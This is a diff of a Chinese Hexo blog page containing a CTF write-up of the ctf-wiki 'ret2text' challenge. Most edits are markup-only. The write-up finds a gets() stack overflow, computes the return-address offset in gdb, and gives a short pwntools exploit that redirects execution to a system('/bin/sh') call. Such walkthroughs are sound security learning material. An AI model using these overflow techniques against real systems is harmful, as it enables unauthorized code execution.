@@ -1,6 +1,8 @@
 <!DOCTYPE html>
 <html lang="zh-CN">
-<head>
+<head><!-- hexo injector head_begin start -->
+<link rel="stylesheet" href="/css/bilicard.css">
+<!-- hexo injector head_begin end -->
   <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width">
 <meta name="theme-color" content="#222" media="(prefers-color-scheme: light)">
@@ -150,7 +152,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#T1-ret2text"><span class="nav-text">T1 ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#0x01"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x02"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x03"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x04"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#0x05"><span class="nav-text">0x05</span></a></li></ol></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link"><span class="nav-text">T1 ret2text</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x01</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x02</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x03</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x04</span></a></li><li class="nav-item nav-level-3"><a class="nav-link"><span class="nav-text">0x05</span></a></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -176,7 +178,7 @@
       </div>
       <div class="site-state-item site-state-tags">
           <a href="/tags/">
-        <span class="site-state-item-count">8</span>
+        <span class="site-state-item-count">7</span>
         <span class="site-state-item-name">标签</span></a>
       </div>
   </nav>
@@ -368,18 +370,18 @@
     
     
     <div class="post-body" itemprop="articleBody">
-        <h2 id="T1-ret2text"><a href="#T1-ret2text" class="headerlink" title="T1 ret2text"></a>T1 ret2text</h2><blockquote>
+        <h2><span id="t1-ret2text">T1 ret2text</span></h2><blockquote>
 <p>2023-01-09WP<br>ctf-wiki基础rop</p>
 </blockquote>
 <span id="more"></span>
 
-<h3 id="0x01"><a href="#0x01" class="headerlink" title="0x01"></a>0x01</h3><p>file checksec——32-bit， 开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-20e95bd89f447f1d91529cc30f6128ce_1440w.webp"></p>
-<h3 id="0x02"><a href="#0x02" class="headerlink" title="0x02"></a>0x02</h3><p>IDA查看代码，可以看出main函数中有gets函数，存在栈溢出漏洞<br><img data-src="https://pic4.zhimg.com/80/v2-535180f34be67dbe755cf8473706034b_1440w.webp"><br>发现还有有一个secure函数调用了system(“&#x2F;bin&#x2F;sh”)<br><img data-src="https://pic2.zhimg.com/80/v2-fc8a7c446eb25d23f3b1743f1720ec71_1440w.webp"><br>双击字符串Ctrl+X，记下”&#x2F;bin&#x2F;sh”的地址0x0804863A<br>0x0804863A就是需要返回的地址</p>
-<h3 id="0x03"><a href="#0x03" class="headerlink" title="0x03"></a>0x03</h3><p>用gdb调试<br>在调用gets函数的地址处0x080486AE设置断点<br>r 运行如下<br><img data-src="https://pic4.zhimg.com/80/v2-e896b8f6a61789dae7d55da0447d61c3_1440w.webp"><br>其中ebp为0xffffcff8,esp为0xffffcf70,那么s为[esp+0x1c]即0xffffcf8c，相对于ebp的偏移是0x6c，相对于返回地址的偏移是0x6c+4</p>
-<h3 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h3><p>写exp</p>
+<h3><span id="0x01">0x01</span></h3><p>file checksec——32-bit， 开启NX<br><img data-src="https://pic3.zhimg.com/80/v2-20e95bd89f447f1d91529cc30f6128ce_1440w.webp"></p>
+<h3><span id="0x02">0x02</span></h3><p>IDA查看代码，可以看出main函数中有gets函数，存在栈溢出漏洞<br><img data-src="https://pic4.zhimg.com/80/v2-535180f34be67dbe755cf8473706034b_1440w.webp"><br>发现还有有一个secure函数调用了system(“&#x2F;bin&#x2F;sh”)<br><img data-src="https://pic2.zhimg.com/80/v2-fc8a7c446eb25d23f3b1743f1720ec71_1440w.webp"><br>双击字符串Ctrl+X，记下”&#x2F;bin&#x2F;sh”的地址0x0804863A<br>0x0804863A就是需要返回的地址</p>
+<h3><span id="0x03">0x03</span></h3><p>用gdb调试<br>在调用gets函数的地址处0x080486AE设置断点<br>r 运行如下<br><img data-src="https://pic4.zhimg.com/80/v2-e896b8f6a61789dae7d55da0447d61c3_1440w.webp"><br>其中ebp为0xffffcff8,esp为0xffffcf70,那么s为[esp+0x1c]即0xffffcf8c，相对于ebp的偏移是0x6c，相对于返回地址的偏移是0x6c+4</p>
+<h3><span id="0x04">0x04</span></h3><p>写exp</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">sh = process(&#x27;./ret2text&#x27;)</span><br><span class="line">target = 0x804863a</span><br><span class="line">sh.sendline(b&#x27;A&#x27; * (0x6c+4) + p32(target))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
-<h3 id="0x05"><a href="#0x05" class="headerlink" title="0x05"></a>0x05</h3><p><strong>疑问：</strong>我有一点不明白的是为什么IDA中看到的s相对于ebp的偏移是64h，而gdb调试出来的是0x6c+4<br>网上看到有一个只用IDA就成功地算出了偏移量，但对于文章里的解释并不是很理解<br>只能说有时候IDA还是与gdb的有出入，不过还是以gdb调试的为准<br><img data-src="https://pic2.zhimg.com/80/v2-3afcfae075e4dbe213e06287af171919_1440w.webp"></p>
+<h3><span id="0x05">0x05</span></h3><p><strong>疑问：</strong>我有一点不明白的是为什么IDA中看到的s相对于ebp的偏移是64h，而gdb调试出来的是0x6c+4<br>网上看到有一个只用IDA就成功地算出了偏移量，但对于文章里的解释并不是很理解<br>只能说有时候IDA还是与gdb的有出入，不过还是以gdb调试的为准<br><img data-src="https://pic2.zhimg.com/80/v2-3afcfae075e4dbe213e06287af171919_1440w.webp"></p>
 
     </div>
 
@@ -587,13 +589,13 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-chart-line"></i>
     </span>
-    <span title="站点总字数">211k</span>
+    <span title="站点总字数">212k</span>
   </span>
   <span class="post-meta-item">
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">3:12</span>
+    <span title="站点阅读时长">3:13</span>
   </span>
 </div>
 <div class="busuanzi-count">
